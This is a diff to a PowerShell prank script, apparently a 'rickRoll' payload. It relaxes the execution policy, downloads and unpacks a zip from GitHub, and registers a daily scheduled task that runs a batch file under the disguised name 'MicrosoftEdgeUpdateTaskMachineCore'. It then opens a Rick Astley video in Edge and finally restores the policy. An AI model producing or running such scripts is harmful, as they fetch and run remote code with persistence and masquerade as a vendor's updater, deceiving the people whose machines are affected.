@@ -1,3 +1,4 @@
+Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 mkdir C:\temp
    
 Invoke-WebRequest 'https://github.com/CHONK12/rickRoll/archive/refs/heads/main.zip' -OutFile C:\temp\rick.zip
@@ -30,4 +31,4 @@ $action = New-ScheduledTaskAction -Execute 'C:\temp\rickRoll-main\lobster.bat'
 $trigger = New-ScheduledTaskTrigger -Daily -At 3pm
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MicrosoftEdgeUpdateTaskMachineCore{32533}" -Description "Ear death"
 Start-Process msedge https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
-
+Set-ExecutionPolicy -Scope CurrentUser Restricted
